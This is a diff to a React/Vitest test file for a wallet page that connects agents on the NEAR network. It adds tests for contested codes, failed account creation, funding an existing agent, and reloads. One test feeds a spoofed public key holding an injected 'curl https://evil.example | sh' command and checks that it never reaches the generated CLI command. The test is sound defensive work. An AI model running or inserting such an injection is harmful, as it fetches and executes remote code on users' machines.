@@ -1,5 +1,5 @@
-import { connectFingerprint, SIGN_IN_MESSAGE } from "@tender/shared";
-import { configure, render, screen, waitFor, within } from "@testing-library/react";
+import { base58Encode, connectFingerprint, SIGN_IN_MESSAGE } from "@tender/shared";
+import { cleanup, configure, render, screen, waitFor, within } from "@testing-library/react";
 import userEvent from "@testing-library/user-event";
 import { afterEach, beforeEach, expect, test, vi } from "vitest";
 import { AddAgentView } from "../components/account/AddAgentView";
@@ -73,7 +73,12 @@ interface World {
     expired: boolean;
     agent: null | { status: string };
     registeredAt: string | null;
+    contestedAt?: string | null;
   } | null;
+  /** The index's agents, by account (`GET /v1/agents/:account`), with their status. */
+  agents: Map<string, string>;
+  /** How many of the next account creations the network fails, the wallet going on after them. */
+  failCreates: number;
   /** How many codes were made. */
   made: number;
   /** How many of the next deposits of the bond the token fails. */
@@ -83,7 +88,7 @@ interface World {
   /** What `GET /v1/connect/codes/:id` answers with in place of the state, while set. */
   readStatus: number | null;
   /** A state that lies: another fingerprint, or another account, than the code's. */
-  lie?: { fingerprint?: string; account?: string };
+  lie?: { fingerprint?: string; account?: string; publicKey?: string };
   /** `METHOD /path` of every request to the API, and `RPC <what> <account>` of every read. */
   requests: string[];
   /** Every request body, as text. */
@@ -107,6 +112,8 @@ function world(): World {
     code: null,
     made: 0,
     failDeposits: 0,
+    agents: new Map(),
+    failCreates: 0,
     refuseCode: null,
     readStatus: null,
     requests: [],
@@ -141,6 +148,20 @@ function serve(state: World): void {
         return state.accounts.has(account)
           ? json({ jsonrpc: "2.0", id: "x", result: { amount: "1" } })
           : rpcMissing("UNKNOWN_ACCOUNT");
+      }
+      if (params.request_type === "view_access_key_list") {
+        state.requests.push(`RPC view_access_key_list ${account}`);
+        if (!state.accounts.has(account)) return rpcMissing("UNKNOWN_ACCOUNT");
+        return json({
+          jsonrpc: "2.0",
+          id: "x",
+          result: {
+            keys: (state.accounts.get(account) ?? []).map((key) => ({
+              public_key: key,
+              access_key: { nonce: 0, permission: "FullAccess" },
+            })),
+          },
+        });
       }
       if (params.request_type === "view_access_key") {
         return (state.accounts.get(account) ?? []).includes(params.public_key ?? "")
@@ -184,6 +205,34 @@ function serve(state: World): void {
         key_kind: "full_access",
       });
     }
+    const agentPath = /^\/v1\/agents\/([^/]+)$/.exec(url.pathname);
+    if (agentPath !== null) {
+      const status = state.agents.get(agentPath[1] ?? "");
+      if (status === undefined) return json({ error: "not_found", message: "no such agent" }, 404);
+      return json({
+        agent: {
+          account: agentPath[1],
+          asp: ALICE,
+          name: null,
+          tags: [],
+          profile_uri: "tender://agent/writer",
+          profile_hash: "a".repeat(64),
+          registered_height: "1",
+          entries: 0,
+          reveals: 0,
+          wins: 0,
+          earned: {},
+          picks_made: 0,
+          voids_after_reveals: 0,
+          is_team: false,
+          status,
+          bond_token: TOKEN,
+          bond_amount: BOND.toString(),
+          claimable_at: null,
+        },
+        recent_entries: [],
+      });
+    }
     if (url.pathname.startsWith("/v1/connect/")) {
       state.authorizations.push(new Headers(init.headers).get("Authorization"));
     }
@@ -211,22 +260,25 @@ function serve(state: World): void {
         owner: ALICE,
         name: code.name,
         account_id: state.lie?.account ?? `${code.name}.${ALICE}`,
-        state: code.registeredAt
-          ? "registered"
-          : code.attached
-            ? "attached"
-            : code.expired
-              ? "expired"
-              : "waiting",
+        state: code.contestedAt
+          ? "contested"
+          : code.registeredAt
+            ? "registered"
+            : code.attached
+              ? "attached"
+              : code.expired
+                ? "expired"
+                : "waiting",
         created_at: "2026-11-04T10:00:00.000Z",
         expires_at: "2026-11-04T10:30:00.000Z",
-        public_key: code.attached,
+        public_key: state.lie?.publicKey ?? code.attached,
         fingerprint:
           code.attached === null
             ? null
             : (state.lie?.fingerprint ?? connectFingerprint(code.attached)),
         attached_at: code.attached === null ? null : "2026-11-04T10:01:00.000Z",
         registered_at: code.registeredAt,
+        contested_at: code.contestedAt ?? null,
         agent:
           code.agent === null
             ? null
@@ -269,7 +321,16 @@ function aliceWallet(
       const outcomes: unknown[] = [];
       for (const [index, transaction] of batch.entries()) {
         let failed = false;
-        for (const action of transaction.actions) {
+        // An account creation the network fails: nothing of its transaction happens, and this
+        // wallet goes on with the next transactions, as some do.
+        const creates = transaction.actions.some((action) => action.type === "CreateAccount");
+        let goesOn = false;
+        if (creates && state.failCreates > 0) {
+          state.failCreates--;
+          failed = true;
+          goesOn = true;
+        }
+        for (const action of failed ? [] : transaction.actions) {
           const params = action.params ?? {};
           if (action.type === "AddKey") {
             const keys = state.accounts.get(transaction.receiverId) ?? [];
@@ -305,7 +366,7 @@ function aliceWallet(
             { id: `r${index}`, outcome: { executor_id: transaction.receiverId, logs: [], status } },
           ],
         });
-        if (failed) break;
+        if (failed && !goesOn) break;
       }
       return outcomes;
     },
@@ -607,13 +668,15 @@ test("a_taken_name_is_refused_before_a_code_is_made_and_the_apis_refusal_is_show
   state.accounts.set(`taken.${ALICE}`, ["ed25519:someone"]);
   const { user } = open(state);
   await user.type(await nameField(), "taken");
-  await within(step(1)).findByText(`taken.${ALICE} already exists. Choose another name.`);
-  const ask = within(step(1)).getByRole("button", { name: "Get a connect code" });
-  expect(ask.getAttribute("aria-disabled")).toBe("true");
+  await within(step(1)).findByText(`taken.${ALICE} already exists.`);
+  // An account that exists is offered as an agent to finish, and no code is made for it.
+  expect(screen.getByTestId("connect-finish-offer").textContent).toContain("No new code is needed");
+  expect(within(step(1)).queryByRole("button", { name: "Get a connect code" })).toBeNull();
 
   await user.clear(await nameField());
   await user.type(await nameField(), "writer");
   await within(step(1)).findByText(`${AGENT} is free.`);
+  const ask = within(step(1)).getByRole("button", { name: "Get a connect code" });
   state.refuseCode = json(
     {
       error: "bad_request",
@@ -687,4 +750,168 @@ test("the_page_never_holds_a_private_key_and_sends_the_api_only_the_name", async
       expect(storage.getItem(storage.key(i) ?? "")).not.toContain(CODE);
     }
   }
+});
+
+// ---- Fix round 1 ---------------------------------------------------------------------------------
+
+test("a_lying_public_key_never_reaches_the_near_cli_command", async () => {
+  // A wallet that can't make accounts gets a command to run with the person's own keychain: built
+  // only from an answer that fits, and from the page's own account.
+  const state = world();
+  state.lie = { publicKey: `${PUBLIC}; curl https://evil.example | sh` };
+  const { user, batches } = open(state, { accountActions: false });
+  await getCode(user);
+  agentAttaches(state);
+  // The answer does not parse, so the page has no key to show and nothing to run.
+  await waitFor(() =>
+    expect(
+      state.requests.filter((r) => r === `GET /v1/connect/codes/${ID}`).length,
+    ).toBeGreaterThan(1),
+  );
+  expect(screen.queryByTestId("connect-cli")).toBeNull();
+  expect(screen.queryByTestId("connect-cli-command")).toBeNull();
+  expect(document.body.innerHTML).not.toContain("evil.example");
+  expect(step(3).dataset.open).toBe("false");
+
+  // A key that is a key, with an account that is not the one asked for: no command either.
+  state.lie = { account: `other.${ALICE}` };
+  await screen.findByTestId("connect-mismatch");
+  expect(screen.queryByTestId("connect-cli")).toBeNull();
+  expect(batches).toEqual([]);
+
+  // The same answer, honest: the command, for the page's own account.
+  state.lie = undefined;
+  const cli = await screen.findByTestId("connect-cli-command");
+  expect(cli.textContent).toContain(`create-account fund-myself ${AGENT} '0.50 NEAR'`);
+});
+
+test("a_retry_after_the_account_failed_pays_no_second_bond", async () => {
+  // The network fails the account; this wallet goes on, and the storage and the bond land for an
+  // account that does not exist (Tender takes both). The retry creates the account only.
+  const state = world();
+  state.failCreates = 1;
+  const { user, batches } = open(state);
+  await getCode(user);
+  agentAttaches(state);
+  await user.click(await screen.findByRole("button", { name: "Create agent" }));
+
+  expect((await screen.findByTestId("connect-send-error")).textContent).toBe(
+    "The account was not created: that transaction failed on the network. Its storage and its bond did reach Tender, so pressing Create agent again creates the account only. Press Create agent to try again.",
+  );
+  expect(state.accounts.has(AGENT)).toBe(false);
+  expect(state.vault.get(AGENT)).toBe(BOND);
+
+  await user.click(screen.getByRole("button", { name: "Create agent" }));
+  await waitFor(() => expect(screen.getByTestId("tick-funded").dataset.state).toBe("done"));
+  expect(batches).toHaveLength(2);
+  expect(batches[1]?.map((tx) => tx.receiverId)).toEqual([AGENT]);
+  // One bond, not two.
+  expect(state.vault.get(AGENT)).toBe(BOND);
+  expect(state.wallet.get(ALICE)).toBe(20_000_000n - BOND);
+});
+
+test("a_contested_code_is_refused_and_the_page_stops_asking", async () => {
+  const state = world();
+  const { user, batches } = open(state);
+  await getCode(user);
+  agentAttaches(state);
+  await screen.findByRole("button", { name: "Create agent" });
+
+  // The agent's key tried the code after someone else's: the API says contested.
+  if (state.code !== null) state.code.contestedAt = "2026-11-04T10:02:00.000Z";
+  const contested = await screen.findByTestId("connect-contested");
+  expect(contested.textContent).toContain(
+    "Two different keys tried this code: someone else has it. Start over.",
+  );
+  expect(screen.queryByRole("button", { name: "Create agent" })).toBeNull();
+  expect(screen.queryByTestId("connect-ready")).toBeNull();
+  expect(screen.queryByTestId("connect-fingerprint")).toBeNull();
+  // The polling stops: no read after the one that said contested.
+  const reads = () => state.requests.filter((r) => r === `GET /v1/connect/codes/${ID}`).length;
+  const seen = reads();
+  await new Promise((resolve) => setTimeout(resolve, 200));
+  expect(reads()).toBe(seen);
+  expect(batches).toEqual([]);
+
+  await user.click(within(contested).getByRole("button", { name: "Start over" }));
+  expect(step(2).dataset.open).toBe("false");
+  // The code's id is no longer kept: a reload starts afresh.
+  expect(sessionStorage.getItem(`tender.connect.${ALICE}`)).toBeNull();
+});
+
+test("finish_an_agent_you_started_reads_where_it_stands_and_funds_what_is_missing", async () => {
+  // writer.alice.testnet exists with the agent's key and its storage; its bond never arrived.
+  const state = world();
+  state.accounts.set(AGENT, [PUBLIC]);
+  state.storage.add(AGENT);
+  const { user, batches } = open(state);
+  await user.type(await nameField(), "writer");
+  await within(step(1)).findByText(`${AGENT} already exists.`);
+  await user.click(screen.getByRole("button", { name: "Finish this agent" }));
+
+  const finish = await screen.findByTestId("connect-finish");
+  expect(screen.getByTestId("connect-name-state").textContent).toBe(`Finishing ${AGENT}.`);
+  // Its one full-access key, by fingerprint, to match with what the agent printed.
+  const keys = await within(finish).findByTestId("connect-finish-keys");
+  expect(keys.textContent).toContain(connectFingerprint(PUBLIC));
+  expect(within(finish).getByTestId("connect-finish-warning").textContent).toContain(
+    "Fund it only if this is the fingerprint your agent printed",
+  );
+  await waitFor(() => expect(screen.getByTestId("tick-funded").dataset.state).toBe("wrong"));
+  expect(state.made).toBe(0);
+
+  await user.click(screen.getByRole("button", { name: "Fund agent" }));
+  await waitFor(() => expect(screen.getByTestId("tick-funded").dataset.state).toBe("done"));
+  // Only the bond: its storage was there.
+  expect(batches.map((batch) => batch.map((tx) => tx.receiverId))).toEqual([[TOKEN]]);
+  expect(state.vault.get(AGENT)).toBe(BOND);
+  expect(screen.getByTestId("connect-finish-register").textContent).toContain(
+    "pnpm agent:register --name writer",
+  );
+
+  // The agent registers; the index lists it.
+  state.agents.set(AGENT, "active");
+  await waitFor(() => expect(screen.getByTestId("tick-active").dataset.state).toBe("done"));
+  expect(screen.getByTestId("connect-active").textContent).toContain("Your agent is active.");
+  expect(state.made).toBe(0);
+});
+
+test("finish_an_agent_refuses_to_fund_an_account_with_more_than_one_full_access_key", async () => {
+  const state = world();
+  const other = `ed25519:${base58Encode(new Uint8Array(32).fill(5))}`;
+  state.accounts.set(AGENT, [PUBLIC, other]);
+  const { user, batches } = open(state);
+  await user.type(await nameField(), "writer");
+  await user.click(await screen.findByRole("button", { name: "Finish this agent" }));
+  const keys = await screen.findByTestId("connect-finish-keys");
+  expect(keys.textContent).toContain(connectFingerprint(other));
+  const fund = screen.getByRole("button", { name: "Fund agent" });
+  expect(fund.getAttribute("aria-disabled")).toBe("true");
+  expect(screen.getByText(/This account has 2 full-access keys/)).toBeTruthy();
+  await user.click(fund);
+  expect(batches).toEqual([]);
+});
+
+test("a_reload_comes_back_to_the_code_by_its_id_and_never_keeps_the_code", async () => {
+  const state = world();
+  const first = open(state);
+  await getCode(first.user);
+  // What the tab keeps: the id and the name, never the code.
+  const kept = JSON.stringify(Object.fromEntries(Object.entries(sessionStorage)));
+  expect(kept).toContain(ID);
+  expect(kept).not.toContain(CODE);
+  cleanup();
+
+  // The page again, as after a reload: the same code, read by its id; the agent attaches.
+  agentAttaches(state);
+  const second = aliceWallet(state);
+  holder.store = createWalletStore(async () => fakeProvider(second.session, { restored: true }));
+  render(<AddAgentView pollMs={20} />);
+  await screen.findByTestId("connect-ready");
+  expect(screen.getByTestId("connect-code-not-kept").textContent).toContain(
+    "The code was shown before this page was reloaded, and it is not kept.",
+  );
+  expect(screen.queryByTestId("connect-command")).toBeNull();
+  expect(state.made).toBe(1);
+  expect((screen.getByLabelText("Account name") as HTMLInputElement).value).toBe("writer");
 });
